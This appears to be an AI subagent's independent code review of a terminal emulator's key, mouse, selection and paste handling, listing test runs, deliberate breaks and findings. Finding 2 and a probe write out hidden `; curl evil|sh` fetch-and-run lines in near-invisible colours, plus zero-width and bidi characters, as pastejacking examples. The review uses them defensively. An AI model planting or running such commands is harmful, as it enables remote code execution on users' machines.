# TASK-31: review of part 10b, keys, the mouse, selection and paste (branch `work/10b`)

An independent review by the `opus-review` subagent, which wrote none of the reviewed code, of
`git diff 35f426a...work/10b` at `eabd800`: `crates/zoraya-term` (`keys.rs`, `mouse.rs`, `select.rs`, `session.rs`,
`queue.rs`, `term.rs`, `lib.rs`, `tests_keys.rs`, `tests_session.rs`, `entry/exceptions.txt`), `crates/zoraya-keymap`,
`crates/zoraya-proto-term` (`lib.rs`, `paste.rs`), `crates/zoraya-shell` (`paste.rs`, `editor.rs`, `editor_tests.rs`),
`user/src/bin/term.rs`, `user/src/bin/zosh.rs`, `tests/gui/selection.script`, `tools/term-conformance/check.sh`,
`Cargo.lock`, `fuzz/Cargo.lock`, `docs/design.md`, `docs/adr/invariants.md`, ADR-0332's rule-6 note and the proposed
ADR-0383 to ADR-0385. Read against ADR-0332 (items 7 and 8, INV-0332-1, -2, -5, -7), ADR-0331, ADR-0170, ADR-0096, the
trust-boundary paragraph of `docs/tasks/TASK-31-stage-10.md`, row 10b of `docs/research/stage-10/plan.md` and the part's
report (`docs/tasks/TASK-31-part-10b.md`), whose claims were re-run, not taken.

## What was run

In the worktree of `work/10b`, and a detached scratch copy of `eabd800` for the breaks and probes (reverted after each),
`CARGO_BUILD_JOBS=3`:

| Command | Result |
|---|---|
| `make check` | all checks pass |
| `cargo test -p zoraya-keymap -p zoraya-term -p zoraya-proto-term -p zoraya-shell` | 20, 182 (1 ignored) + 2 replay, 9, 173 pass |
| `GUI_RUNS="selection:auto:1 selection:auto:1920x1200" make test-gui` (HVF) | `PASS: 59 steps` at both sizes |
| `cargo +nightly-2026-11-12 metadata --locked --offline` in `fuzz/` | exit 0: the hand-edited `fuzz/Cargo.lock` is consistent |

Not run: `make test-qemu`, `make test-files`, `make test-boot` (the implementer reports the permission check refused
them; this review did not need them: no kernel or file-path code changed), the TCG GUI runs, `make mutants-host` (the
report's figures are not reproduced here; the equivalence arguments were read, see "Checked and sound").

Hand breaks, each applied alone in the scratch copy and reverted (the tests that fail are named):

| Break | Result |
|---|---|
| B1. `Session::output` answers `CSI 6n` by pushing `Input("\x1b[1;1R")` | fails `output_never_produces_anything_to_send`, `what_is_sent_depends_on_gestures_and_modes_not_on_output_text` (INV-0332-2) |
| B2. `selected_text` copies every cell as drawn text (`shown` ignores fg = bg) | fails `invisible_cells_are_copied_as_spaces`, `a_hidden_run_keeps_its_length_and_is_not_trimmed` (INV-0332-7) |
| B3. `paste::keeps` keeps `ESC` | fails three `zoraya-proto-term` tests and `zoraya-shell`'s `parts_are_joined_until_the_last_and_cleaned` (INV-0332-5) |
| B4. F5 sends `CSI 16 ~` | fails `the_table_sends_what_the_entry_names`, `function_keys_bare_and_modified` (INV-0332-1 key half) |
| B5. focus reported without 1004 | fails `focus_in_and_out_are_the_entrys_kxin_and_kxout` |
| B6. the shell's assembler does not clean | fails `a_paste_never_runs_and_carries_no_control_character` and the assembler test |
| B7. a write to a selected row leaves the selection | fails `what_changes_under_a_selection_ends_it` (INV-0384-1) |
| B8. the editor keeps a pasted tab | fails two editor tests |
| B9. the editor cuts a paste at its first newline | fails five editor tests |
| B10 (by reading). the `Input` mark filter at `user/src/bin/zosh.rs:2562` removed, or a mark given to `editor.key` at `:5140` | no host test can fail: the code is in the binary, outside every host-tested crate (finding 1) |

Probe (scratch test, not committed): output `ls ` then `; curl x|sh` in direct colour 254,254,254 on 255,255,255 (on the
light `term.bg` it cannot be seen), then U+200B and U+202E and `ok`; selected and copied, then through `paste::clean`:
both give `"ls ; curl x|sh \u{200b}\u{202e}ok"` (finding 2).

## Findings

No must-fix. Three should-fix, eight notes.

### 1. should-fix: the shell's half of the paste path is untested where it lives; INV-0384-3's check checks something else

*Where:* `user/src/bin/zosh.rs:2562` (marks filtered out of `Input`), `:5140` (a mark at the prompt goes to
`Editor::paste`), `:2682` (a mark while a program runs is dropped with a notice), `:2956` (dropped in `wait_key`);
`crates/zoraya-shell/src/editor_tests.rs:1120` (`the_paste_path_end_to_end_waits_for_enter`); ADR-0384 INV-0384-3.

*What is wrong:* the four places that make "a paste is one byte of the key stream that no key can make" true are in the
`zosh` binary. The "end to end" test re-implements the main loop's dispatch in the test itself, so it tests the test.
INV-0384-3 ("no byte of `Input` is a paste's mark") names `paste::tests`, which only shows that UTF-8 encodings of four
code points are not marks: it never looks at `Input` or at what `key_bytes` sends, and it would pass with the filter
gone.

*Scenario:* a later change to `read_keys` (10c moves the discipline into `zosh`, and this loop is what it rewrites) drops
the filter or passes a mark to `editor.key` / `type_key`. Then a `ttyd` peer's raw 0xF8 takes a stored paste out of order,
or a paste while a program runs reaches the program as the byte 0xF8; `cargo test` and the GUI script (which only pastes at
the prompt) stay green.

*Fix:* move the dispatch into `zoraya_shell::paste` (a function that turns an `Input` into key bytes without marks, and
a small router that, given "at the prompt" or "program in front", says insert, drop with notice, or key) and call it from
`zosh.rs`; test it there, including a hostile `Input` holding 0xF8..0xFF. Add a `zoraya-term` test that `key_bytes` over
every key code, every modifier set, both modes and a sweep of `text` never writes a byte in 0xF8..0xFF, and the same for
pointer and focus reports. Name both in INV-0384-3's check.

### 2. should-fix: "what is copied is what was seen" holds for exact equality only; invisible format characters pass both the copy and the cleaning

*Where:* `crates/zoraya-term/src/select.rs:155` (`fg != bg`), `:159` (marks copied when not `is_control`);
`crates/zoraya-proto-term/src/paste.rs:18` (`keeps`: only `Cc` is removed); ADR-0384 Option A items 1 and 4.

*What is wrong:* a cell is "seen" when its colours differ by one unit of one channel; and a width-0 format character
(U+200B to U+200F, U+202A to U+202E, U+2060 to U+2069, U+FEFF: `Cf`, not `Cc`) is joined to the cell before it, drawn as
nothing, copied, and kept by `clean`. The probe above shows both. The implementation matches INV-0332-7's wording
("equal"), so this is a gap in the proposed design, not a broken accepted invariant.

*Scenario:* `cat README` shows `make install`; the file holds `; curl evil|sh` in 254,254,254 on 255,255,255 after it.
The person selects the line and pastes. At the prompt the editor draws the pasted text in its own colours, so the person
can still see it before Enter (the mitigation is the editor, not the copy). In part 10c a paste to a program that set 2004
goes in brackets with no confirmation when it has no newline: the hidden text reaches a POSIX `sh` or `vi` unseen.
Zero-width characters reach the line invisibly even at the prompt (an argument that is not the file name it looks like).

*Fix:* before 10c, in ADR-0384 (proposed, so no superseding ADR is needed): copy a cell as a space when its contrast
against its background is below a stated threshold (for example a WCAG ratio below 1.5, or every channel within 8), and
drop the bidirectional and zero-width format characters in `clean` and in the copy, or show them in the editor as a
visible mark. Add the probe's cases to `invisible_cells_are_copied_as_spaces` and to `zoraya-proto-term`'s sweep (which
stops at U+01FF and so never meets U+200B or U+202E).

### 3. should-fix: Backspace and the entry's `kbs=^H` must be settled before 10d; the meta-mode exceptions are now load-bearing

*Where:* `crates/zoraya-term/entry/exceptions.txt` (`kbs`, `km`, `smm`, `rmm`); ADR-0383 Option A item 1 and its
"Evidence against".

*What is wrong:* keeping `0x7f` is right (ADR-0096 is accepted and binding, and xterm, st and foot send it), and the
exception is honest. But part 10d ports ncurses, `less` and `vi` against this entry; a curses program with `keypad(TRUE)`
recognises Backspace as `KEY_BACKSPACE` through `kbs`, and with `kbs=^H` it will see 127 as a plain character. The ADR's
sentence that "ncurses' own `getch` maps the erase character to `KEY_BACKSPACE` too" has no citation and was not checked
by the part; if it is wrong, every curses line editor in 10d mishandles Backspace. Separately: the paste marks are the
bytes 0xF8 to 0xFF, and an eight-bit meta mode (`km`/`smm`, 1034) would make Alt+x through Alt+DEL exactly those bytes
(`0x78 | 0x80 = 0xF8` ... `0x7f | 0x80 = 0xFF`), which `zosh` would then silently eat. The ADR does not say that the
mark scheme forbids meta mode.

*Fix:* ask the architect to decide Option C (build the entry with `kbs=^?`, as Debian, Fedora and macOS ship it) before
10d starts, or have 10d's curses test program press Backspace. Add to ADR-0383's `km`/`smm` reason and to ADR-0384 item 4
that the paste marks depend on `Input` never carrying 0xF8..0xFF, so meta mode stays excepted while they are used.

### 4. note: a ninth paste waiting replaces the first, out of order and without a word

*Where:* `crates/zoraya-shell/src/paste.rs:57` (`Store::put`).
*Scenario:* the shell runs a builtin for a while; the person presses System+V nine times (`term` holds up to 128 KiB of
paste). At the next read the first mark gives the ninth text, marks two to eight give theirs, the ninth gives nothing:
the first paste is lost and the order changed. *Fix:* when `put` overwrites a slot not yet taken, say so (`zosh: paste:
dropped`) or drop the new paste instead; or size the store to the queue.

### 5. note: a paste cut by `SendQueue::fail` leaves a fragment that the next paste is joined to

*Where:* `crates/zoraya-term/src/queue.rs:112`, `crates/zoraya-shell/src/paste.rs:35`.
*Scenario:* the shell's channel refuses a write (no kernel memory) after some parts of a paste were sent; the rest is
dropped, no `last` arrives, and the next paste's text is appended to the first one's head. Cleaned and shown before
Enter, so it runs nothing; it is wrong text. *Fix:* a `first` flag in `Paste` (the assembler starts afresh on it), or
`term` sends an empty part with `last` after `fail`.

### 6. note: "a paste while a program runs is dropped" is not exact

*Where:* `user/src/bin/zosh.rs:4650` (`interrupted`: keys, marks with them, go to `pending`), `:2741` (keys dropped
without taking their slots), and the Ctrl-Z path (`keys[i + 1..]` to `pending`).
A paste during a builtin, or after Ctrl-Z in the same batch, is inserted at the next prompt; one during a reporting wait
is dropped with no notice. None runs anything. *Fix:* say it in ADR-0384 item 5 and `docs/design.md`, or route these
through the router of finding 1.

### 7. note: `Session` is not the only code that sends

*Where:* `user/src/bin/term.rs:218` (`Size`), `offer` (`Offer` to the compositor); ADR-0385, `docs/design.md`.
Both come from compositor events, so INV-0332-2 holds, but "the only code that makes anything to send" overclaims, and
INV-0385-2's check covers `Session` only. *Fix:* reword, or move `Size` into `Session` so that its test covers it.

### 8. note: a paste keeps the editor's pending states

*Where:* `crates/zoraya-shell/src/editor.rs:1090`.
After Ctrl+V, or a lone Esc (`Escape::Started`), a paste is inserted and the state survives it: the next key is quoted,
or swallowed. *Fix:* `paste` clears `quote`, `escape` and `utf8`.

### 9. note: the GUI script pastes only short text, in the US layout

A paste of more than 4 KiB (several `Paste` parts, the queue, `zosh`'s 4.5 KiB read buffer) never runs through the
binaries; the four-layout claims rest on `zoraya-keymap`'s host tests, which do check Ctrl, Alt and AltGr per layout.
*Fix:* one step that pastes a selection of more than 4 KiB (a full screen at 1920 x 1200 is about 5 KiB).

### 10. note: one commit without `make check`

The report says `2f66c30` was committed after `make adr-check` only; CLAUDE.md asks for `make check` before every commit.
`make check` passes at the head.

### 11. note: the mutation figures are the report's

Not re-run here. The passes after the last tests were partial (`queue.rs`, `mouse.rs`, `select.rs`, then `mouse.rs`
alone), so there is no final whole-crate figure for `zoraya-term`. The equivalence arguments read sound (see
"Checked and sound").

## Checked and sound

- **Output to input.** `Session::output` only writes the grid; the outbox is filled only by `key`, `pointer`, `wheel`,
  `focus` and `paste`; `term` sends only `take_outbox` (plus `Size` and `Offer`, finding 7). Mouse and focus reports
  depend on output only through modes; DECSTR in `BEFORE_PROMPT` resets 1000, 1002, 1004, 2004, DECCKM and the keypad
  mode before each prompt. A report's bytes hold no CR or newline, so a report cannot run a line; at the prompt the
  editor drops `CSI <...M` and `CSI I`/`O` as unknown finals.
- **Clipboard.** `Offer` is sent only in answer to the compositor's `Copy` (System+C or System+X), only with a
  non-empty selection; OSC 52 is never acted on. A selection is made only by the person's pointer, and ends on any
  write to its rows, a view scroll (output snaps the view back with `touch_all`), a resize, DECSTR, RIS or a palette
  change, so a copy is never of text changed after the selection was drawn. A hidden cell stays hidden when selected,
  so the highlight shows the spaces that are copied. Text with echo off is never in the grid.
- **Paste.** `term` never sends a paste as `Input` (INV-0384-2, tested); parts are whole characters, bounded, and kept
  or dropped whole by the queue; the shell cleans (no `Cc`, CR as newline, invalid UTF-8 as U+FFFD), the closing mark
  `CSI 201~` loses its `ESC`; the editor inserts at the cursor, a newline makes a continuation line, nothing is
  returned as `Key::Line` until the person's Enter (B9 and the editor tests); the limits cut and say so. No byte a key,
  a report or UTF-8 makes is in 0xF8..0xFF, so the marks cannot be forged by `term`; the `Input` filter covers other
  peers.
- **Keys.** Every `k*` capability of the entry is a row compared byte for byte or a reasoned exception; the tool now
  fails on a leftover `deferred (10b)`. Of the eight re-excepted: `kPRV`/`kNXT` are required by ADR-0332 item 7;
  `kbeg`/`kp5` follow from no NumLock (the centre key sends `kb2`'s `\EOu` in keypad mode, tested); `km`/`smm`/`rmm`
  follow from Alt as an `ESC` prefix (finding 3 adds why they must stay). AltGr in a layout with a third level carries
  no Alt bit (tested in all four layouts), so `AltGr+q` is not `ESC q`; Ctrl+letters keep their physical fallback;
  Ctrl+Shift+6 and Ctrl+Shift+minus now give 0x1e and 0x1f as text to every client, and `zoraya-ui`'s fields drop
  control text. Before 10b Alt was ignored (Alt+x typed `x`); now it is `ESC x`, as ADR-0332 item 7 decides. Key repeat
  and dead keys are untouched by the diff.
- **Sizes.** The selection, the copy and the GUI script do not assume 24 rows: the script clears and uses the first
  rows, and passes at the default size and at 1920 x 1200 (22 rows). The Shift+Page step is half the rows.
- **Equivalent mutants.** `|` for `^` in `code_mods`, the button codes and the wheel code combine disjoint bits; zero
  notches make no report either way; column 0 never holds the right half of a wide character.
- **Unsafe, dependencies.** No `unsafe` in the diff; no external crate; both lock files changed only by the new path
  dependency on `zoraya-proto-term`, and `fuzz/Cargo.lock` passes `--locked`.
- **Docs.** `docs/design.md`'s new paragraphs match the code (apart from finding 6's wording); the Status cells of
  INV-0332-2, -5 (partly) and -7 name tests that exist and fail when broken (B1, B2, B3, B6).

## Recommendation

Mergeable: no accepted invariant is broken and the trust boundary holds in the code as it is. Findings 1 and 3's two ADR
sentences are small and best done in a fix pass on `work/10b` before the merge, because 10c rewrites the loop finding 1 is
about; finding 2 and the Backspace decision of finding 3 must be settled before 10c and 10d respectively. The notes can
go to `docs/backlog.md`.
